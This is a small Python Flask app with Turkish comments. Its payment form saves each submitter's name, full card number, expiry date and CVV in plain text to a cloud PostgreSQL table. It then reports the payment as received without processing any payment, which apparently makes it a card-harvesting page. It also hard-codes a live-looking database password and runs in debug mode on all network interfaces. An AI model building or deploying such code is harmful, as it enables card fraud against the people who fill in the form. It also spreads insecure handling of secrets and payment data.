import os
from flask import Flask, render_template, request, redirect, url_for
import psycopg2  # PostgreSQL bağlantısı için

app = Flask(__name__)

# Supabase Veritabanı Bağlantı Bilgileri
DB_HOST = "db.frfxpoeacbrfjklyyxma.supabase.co"
DB_NAME = "postgres"
DB_USER = "postgres"
DB_PASSWORD = "atillathegreat1453"  
DB_PORT = "5432"

def get_db_connection():
    conn = psycopg2.connect(
        host=DB_HOST,
        database=DB_NAME,
        user=DB_USER,
        password=DB_PASSWORD,
        port=DB_PORT
    )
    return conn

# Veritabanında tablo yoksa otomatik oluşturan fonksiyon
def init_db():
    try:
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS siparisler (
                id SERIAL PRIMARY KEY,
                adsoyad VARCHAR(100),
                kart_numarasi VARCHAR(50),
                SKT VARCHAR(10),
                cvv VARCHAR(5),
                tarih TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        cur.close()
        conn.close()
    except Exception as e:
        print("DB init error:", e)

# Uygulama başladığında tabloyu kontrol et/oluştur
init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/odeme', methods=['POST'])
def odeme():
    # HTML formundaki input name'in "adsoyad" olduğundan emin ol!
    adsoyad = request.form.get('adsoyad') 
    kart_numarasi = request.form.get('kart_numarasi')
    skt = request.form.get('skt')
    cvv = request.form.get('cvv')

    # Verileri Supabase (Bulut) Veritabanına Kaydetme (Sütun adı 'adsoyad' olarak düzeltildi)
    conn = get_db_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO siparisler (adsoyad, kart_numarasi, SKT, cvv) VALUES (%s, %s, %s, %s)",
        (adsoyad, kart_numarasi, skt, cvv)
    )
    conn.commit()
    cur.close()
    conn.close()

    return "Ödemeniz başarıyla alındı!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)